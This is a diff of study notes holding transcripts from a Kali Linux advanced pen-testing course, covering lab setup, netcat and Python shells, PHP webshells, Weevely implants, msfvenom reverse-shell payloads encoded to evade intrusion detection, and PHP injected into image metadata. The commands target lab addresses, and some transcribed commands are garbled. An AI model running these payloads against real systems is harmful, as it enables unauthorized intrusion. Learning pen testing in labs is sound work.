-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980)
+#### [Using the LinkedIn Learning penetration testing lab](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=0)** - [Instructor] In my first Kali Linux course, I showed you how to set up a test network with Metasploitable as your main testing target and with some servers as discrete targets.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=0)** - [Instructor] In my first [[Kali Linux]] course, I showed you how to set up a test network with Metasploitable as your main testing target and with some servers as discrete targets.
 >
 > **[0:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=11)** We'll be using these targets in this pen testing series of courses.
 >
@@ -740,7 +731,7 @@ created: 2026-05-02
 >
 > **[0:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=19)** For your advanced work, you'll want to have a wider selection of targets, and that becomes quite difficult to maintain for yourself.
 >
-> **[0:27](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=27)** Offensive Security, the folks who provide Kali and run the OSCP certification, provide a number of proving grounds for building up your skills in penetration testing.
+> **[0:27](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=27)** Offensive Security, the folks who provide Kali and run the [[OSCP]] certification, provide a number of proving grounds for building up your skills in [[Penetration Testing]].
 >
 > **[0:38](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=38)** There's a free-to-use PG Play, and also a more extensive paid PG Practice.
 >
@@ -768,7 +759,7 @@ created: 2026-05-02
 >
 > **[1:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=108)** You can register through a free subscription and have access to just a limited number of active systems, or you can take a paid VIP subscription and have access to all of the active and the retired systems in the lab.
 >
-> **[2:02](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=122)** Let's take a look at the LinkedIn Learning lab.
+> **[2:02](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=122)** Let's take a look at the [[LinkedIn]] Learning lab.
 >
 > **[2:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=125)** At this stage, the dedicated labs have not been added to the new interface, so we'll log into the legacy site using the home URL.
 >
@@ -796,7 +787,7 @@ created: 2026-05-02
 >
 > **[3:13](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=193)** And I connect using sudo openvpn kiwi.ovpn.
 >
-> **[3:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=204)** In another terminal, I can scan the network with Nmap.
+> **[3:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=204)** In another terminal, I can scan the network with [[Nmap]].
 >
 > **[3:27](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980&t=207)** nmap
 >
@@ -808,7 +799,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** vpn (4), [[LinkedIn]] (3), career (2), [[Kali Linux]] (1), [[Security]] (1)
+> **Frameworks & Libraries:** [[LinkedIn]] (3), [[Nmap]] (2), [[Kali Linux]] (1), [[OSCP]] (1), [[Penetration Testing]] (1)
 > **Env Vars:** vpn (4), vip (2), oscp (1), url (1)
 > **Prerequisites:** set up (2), you'll need (2)
 > **Speakers:** - [instructor] (1), - sn (1)
@@ -822,8 +813,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Introduction to shells
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980)
+#### [Introduction to shells](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -831,7 +821,7 @@ created: 2026-05-02
 >
 > **[0:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=7)** We'll need a variety of shells on hand to include in our exploits.
 >
-> **[0:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=12)** The simplest way to get a show is netcat.
+> **[0:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=12)** The simplest way to get a show is [[Netcat]].
 >
 > **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=15)** If the target has netcat installed, then it's easier to establish a direct command line shell.
 >
@@ -845,9 +835,9 @@ created: 2026-05-02
 >
 > **[1:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=63)** And in Kali, when we request the host name, we find this metasploitable.
 >
-> **[1:09](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=69)** Okay, we'll have a Linux shell on metasploitable.
+> **[1:09](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=69)** Okay, we'll have a [[Linux]] shell on metasploitable.
 >
-> **[1:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=74)** We're a bit limited here, but we can use Python to pop up a higher level shell, which provides a better experience for us.
+> **[1:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=74)** We're a bit limited here, but we can use [[Python (Programming Language)|Python]] to pop up a higher level shell, which provides a better experience for us.
 >
 > **[1:21](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=81)** python -c "import pty:pty.spawn("/binbash").
 >
@@ -877,7 +867,7 @@ created: 2026-05-02
 >
 > **[2:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=168)** WhoamI, hostname.
 >
-> **[2:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=174)** Getting back to netcat, I can also create a shell connection to a Windows target.
+> **[2:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=174)** Getting back to netcat, I can also create a shell connection to a [[Windows]] target.
 >
 > **[3:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introduction-to-shells?u=76281980&t=180)** I'll set up my Windows host system as a listener using the Windows version of the netcat utility.
 >
@@ -891,15 +881,14 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (4), [[Linux]] (2), [[Python (Programming Language)|Python]] (2), prompt (1)
+> **Frameworks & Libraries:** [[Netcat]] (6), [[Windows]] (4), [[Linux]] (2), [[Python (Programming Language)|Python]] (2)
 > **Tools:** bash (3), command line (2), command prompt (1)
 > **CLI Commands:** python (2), find (1), make (1)
 > **Versions:** 10.0.2 (1), 127.0.0 (1), 192.168.1 (1)
 > **Prerequisites:** set up (2), install (1)
 > **Speakers:** - [instructor] (1)
 
-#### Exploring Kali webshells
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980)
+#### [Exploring Kali webshells](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -911,7 +900,7 @@ created: 2026-05-02
 >
 > **[0:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=18)** If it doesn't support the active code, then it will just display a panel asking whether to open or save the file.
 >
-> **[0:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=26)** Because different targets will have different forms of active code, you need to have as many web shells available as possible.
+> **[0:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=26)** Because different targets will have different [[Forms]] of active code, you need to have as many web shells available as possible.
 >
 > **[0:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=33)** Kali provides a number of web shells to support the various active code options.
 >
@@ -919,11 +908,11 @@ created: 2026-05-02
 >
 > **[0:39](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=39)** LS /user/share/webshells.
 >
-> **[0:46](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=46)** Here we can see folders for ASP, ASPX, CFM, JSP, Perl, and PHP.
+> **[0:46](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=46)** Here we can see folders for ASP, ASPX, CFM, JSP, Perl, and [[PHP]].
 >
 > **[0:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=54)** The different variants of the same basic shell approach.
 >
-> **[0:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=57)** We also have the Laudanum repository of web shells to be used in conjunction with SQL injections.
+> **[0:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=57)** We also have the Laudanum repository of web shells to be used in conjunction with [[SQL]] injections.
 >
 > **[1:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=67)** A popular form of active content is PHP.
 >
@@ -945,9 +934,9 @@ created: 2026-05-02
 >
 > **[2:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=132)** We need to be able to upload the PHP file into a folder, which is directly accessible from the URL.
 >
-> **[2:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=138)** For Linux, this is typically in var/www or one of his descendant folders such as var/www/HTML.
+> **[2:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=138)** For [[Linux]], this is typically in var/www or one of his descendant folders such as var/www/[[HTML]].
 >
-> **[2:27](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=147)** For Windows, this is typically in inet/pub/wwwroot.
+> **[2:27](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=147)** For [[Windows]], this is typically in inet/pub/wwwroot.
 >
 > **[2:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=152)** Some systems will have their own special purpose directories.
 >
@@ -971,7 +960,7 @@ created: 2026-05-02
 >
 > **[3:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=215)** Two other forms of shell we might find useful are ASP and ASPX.
 >
-> **[3:41](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=221)** ASP is an older technology, but is a default part of older Microsoft IIS websites.
+> **[3:41](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=221)** ASP is an older technology, but is a default part of older [[Microsoft]] IIS websites.
 >
 > **[3:47](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploring-kali-webshells?u=76281980&t=227)** LS /user/share/webshells/asp.
 >
@@ -1031,7 +1020,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (12), [[PHP]] (11), [[Forms]] (2), [[Linux]] (2), [[Windows]] (2)
+> **Frameworks & Libraries:** [[PHP]] (11), [[Forms]] (2), [[Linux]] (2), [[Windows]] (2), [[SQL]] (1)
 > **Env Vars:** php (5), aspx (4), url (3), asp (3), jsp (3)
 > **CLI Commands:** php (11), ls (2), apache (1), find (1)
 > **Versions:** 5.1 (2), 10.10.10 (2), 10.0.2 (1), 10.0.28 (1)
@@ -1040,12 +1029,11 @@ created: 2026-05-02
 > **UI Navigation:** navigate to (2), scroll down (1)
 > **Analogies:** for example (2), such as (1)
 
-#### Weeving a shell
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/weeving-a-shell?u=76281980)
+#### [Weeving a shell](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/weeving-a-shell?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/weeving-a-shell?u=76281980&t=0)** - Weevely is a command-line tool deployed in Kali, which can be used to generate a PHP shell implant.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/weeving-a-shell?u=76281980&t=0)** - Weevely is a command-line tool deployed in Kali, which can be used to generate a [[PHP]] shell implant.
 >
 > **[0:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/weeving-a-shell?u=76281980&t=6)** And then after it's been deployed onto a target, connect to it.
 >
@@ -1153,7 +1141,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[PHP]] (13), data (2)
+> **Frameworks & Libraries:** [[PHP]] (13)
 > **CLI Commands:** php (13), make (2), find (2), cat (1)
 > **Env Vars:** php (6), tcp (2), url (1), http (1)
 > **File Paths:** wish.php (7), test.txt (1), temp/test.txt (1)
@@ -1162,16 +1150,15 @@ created: 2026-05-02
 > **Code Identifiers:** audit_etc (1)
 > **Definitions:** is a  (1)
 
-#### Generating shellcode with msfvenom
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980)
+#### [Generating shellcode with msfvenom](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=0)** - [Instructor] MSFvenom is an important tool which comes with Kali.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=0)** - [Instructor] [[Metasploit|MSFvenom]] is an important tool which comes with Kali.
 >
 > **[0:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=4)** It can be configured to generate shell code for a wide variety of scenarios, both binary and web based.
 >
-> **[0:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=11)** Let's see how we create an executable that we can drop onto a Windows target to make a reverse callback to a waiting Netcat listener.
+> **[0:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=11)** Let's see how we create an executable that we can drop onto a [[Windows]] target to make a reverse callback to a waiting [[Netcat]] listener.
 >
 > **[0:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=19)** We'll call it wince.exe.
 >
@@ -1189,7 +1176,7 @@ created: 2026-05-02
 >
 > **[1:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=72)** Wince, and here we have a Windows shell.
 >
-> **[1:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=79)** An useful option when creating a web shell is the encoder, which can be used to manipulate the generated code to avoid being blocked by intrusion detection systems when we upload it.
+> **[1:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=79)** An useful option when creating a web shell is the encoder, which can be used to manipulate the generated code to avoid being blocked by [[Intrusion Detection]] systems when we upload it.
 >
 > **[1:31](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=91)** Two popular encoding schemes are Base64 and the more effective Shikata Ga Nai encoding.
 >
@@ -1199,7 +1186,7 @@ created: 2026-05-02
 >
 > **[1:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=112)** We'll call winmet.exe.
 >
-> **[1:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=114)** This runs exactly like the Windows shell, except that we use MSFconsole to have a Meterpreter listener set up for the callback.
+> **[1:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=114)** This runs exactly like the Windows shell, except that we use [[Metasploit|MSFconsole]] to have a Meterpreter listener set up for the callback.
 >
 > **[2:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=124)** MSFvenom, and the payload is windows /meterpreter/reverse_tcp, LHOST again is 10.0.2.18, and the LPORT again is 2222, and we'll encrypt with x86/ shikata_ga_nai into an executable and we'll call it when winmet.exe.
 >
@@ -1219,15 +1206,15 @@ created: 2026-05-02
 >
 > **[3:39](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=219)** And here we have the Meterpreter shell.
 >
-> **[3:43](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=223)** Sysinfo, and we can see it's a Windows 10 system.
+> **[3:43](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=223)** Sysinfo, and we can see it's a [[Windows 10]] system.
 >
-> **[3:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=228)** We can create an endpoint for Linux in a similar way, msfvenom -p linux/ x86/meterpreter /reverse_tcp LHOST=10.0.2.8, LPOST=2222.
+> **[3:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=228)** We can create an endpoint for [[Linux]] in a similar way, msfvenom -p linux/ x86/meterpreter /reverse_tcp LHOST=10.0.2.8, LPOST=2222.
 >
 > **[4:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=257)** We'll again encrypt it using x86/ shikata_ga_nai.
 >
 > **[4:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=266)** In this case, the format will be elf and we'll write it out to linmet.
 >
-> **[4:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=273)** We can use MSFvenom to create custom payloads, including backdoors and reverse shells for PHP, ASP, JSP, Perl, and Python.
+> **[4:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=273)** We can use MSFvenom to create custom payloads, including backdoors and reverse shells for [[PHP]], ASP, JSP, Perl, and [[Python (Programming Language)|Python]].
 >
 > **[4:42](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=282)** Let's create a Python reverse shell.
 >
@@ -1281,17 +1268,17 @@ created: 2026-05-02
 >
 > **[8:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=481)** msfvenom -p and we'll create a windows /shell_reverse_tcp with LHOST=10.0.2.18, LPOST=2222, and we can encrypt with x86 /shikata_ga_nai, we'll make the format ASP and we'll write it out to cmd.asp.
 >
-> **[8:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=520)** And we can create JavaScript payloads also.
+> **[8:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=520)** And we can create [[JavaScript]] payloads also.
 >
-> **[8:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=524)** msfvenom -p java /jsp_shell_reverse_tcp HOST=10.0.2.18 LPOST=2222, and we'll put it out in raw format to cmd.jsp.
+> **[8:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=524)** msfvenom -p [[Java]] /jsp_shell_reverse_tcp HOST=10.0.2.18 LPOST=2222, and we'll put it out in raw format to cmd.jsp.
 >
-> **[9:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=557)** We can now upload these implants to web servers running the respective active code and put them into its web tree.
+> **[9:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=557)** We can now upload these implants to [[Web Servers]] running the respective active code and put them into its web tree.
 >
 > **[9:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/generating-shellcode-with-msfvenom?u=76281980&t=564)** And we can gain a command or Meterpreter shell by accessing them via the URL.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (10), [[Python (Programming Language)|Python]] (8), web (4), [[Linux]] (2), [[Intrusion Detection]] (1)
+> **Frameworks & Libraries:** [[Metasploit|Msfvenom]] (10), [[Windows]] (10), [[Python (Programming Language)|Python]] (8), [[Metasploit|Msfconsole]] (4), [[Netcat]] (2)
 > **Env Vars:** lhost (6), lpost (4), lport (3), asp (3), php (1)
 > **CLI Commands:** python (8), make (4), find (1), php (1), chmod (1)
 > **Code Identifiers:** reverse_tcp (5), shikata_ga_nai (3), shell_reverse_tcp (2), reverse_python (2), jsp_shell_reverse_tcp (1)
@@ -1300,8 +1287,7 @@ created: 2026-05-02
 > **Prerequisites:** set up (4)
 > **Tools:** command line (1), bash (1)
 
-#### Injecting images with jhead
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980)
+#### [Injecting images with jhead](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1313,7 +1299,7 @@ created: 2026-05-02
 >
 > **[0:21](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980&t=21)** Images however are not always safe.
 >
-> **[0:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980&t=24)** Jhead is a simple but very useful tool for injecting PHP into an image as metadata, in such a way that it allows us to execute commands via the image, because it uses a real image as the carrier, we can still upload it to a website that checks for a valid image file.
+> **[0:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980&t=24)** Jhead is a simple but very useful tool for injecting [[PHP]] into an image as [[Metadata]], in such a way that it allows us to execute commands via the image, because it uses a real image as the carrier, we can still upload it to a website that checks for a valid image file.
 >
 > **[0:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/injecting-images-with-jhead?u=76281980&t=44)** Let's install Jhead sudo apt install Jhead.
 >
@@ -1368,8 +1354,7 @@ created: 2026-05-02
 > **Prerequisites:** install (2)
 > **Tools:** bash (1)
 
-#### Using shellcode in exploits
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980)
+#### [Using shellcode in exploits](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1377,15 +1362,15 @@ created: 2026-05-02
 >
 > **[0:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=4)** If we download an exploit with an embedded shell, we'll usually need to replace the shell code with our own, to reflect the correct reverse IP address and port.
 >
-> **[0:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=14)** An example of this is the pro FTP Python code that we can see here on GitHub.
+> **[0:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=14)** An example of this is the pro FTP [[Python (Programming Language)|Python]] code that we can see here on [[GitHub]].
 >
 > **[0:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=19)** We can see by looking at the code, that the exploit expects to be updated with an effective shell.
 >
-> **[0:25](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=25)** And it even provides the MSFvenom call to generate it.
+> **[0:25](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=25)** And it even provides the [[Metasploit|MSFvenom]] call to generate it.
 >
 > **[0:29](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=29)** Note the MSFvenom LHOST and LPORT parameters, will need to be modified to our IP address and port.
 >
-> **[0:36](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=36)** For ProFTP, the target is usually Linux, so we need to generate a Linux shell with Bash.
+> **[0:36](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=36)** For ProFTP, the target is usually [[Linux]], so we need to generate a Linux shell with Bash.
 >
 > **[0:43](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-shellcode-in-exploits?u=76281980&t=43)** This exploit has limitations on size, so we need to create the smallest shell we can by including the minus, minus smallest switch.
 >
@@ -1419,7 +1404,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Python (Programming Language)|Python]] (3), [[Linux]] (3), [[GitHub]] (1), next (1)
+> **Frameworks & Libraries:** [[Metasploit|Msfvenom]] (4), [[Python (Programming Language)|Python]] (3), [[Linux]] (3), [[GitHub]] (1)
 > **Env Vars:** ftp (2), lhost (2), lport (2), tcp (1), x09 (1)
 > **CLI Commands:** python (3)
 > **Tools:** bash (2), github (1)
@@ -1433,8 +1418,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Exploiting systems with Kali
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980)
+#### [Exploiting systems with Kali](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-systems-with-kali?u=76281980)
 
 > [!transcript]- Transcript
 >
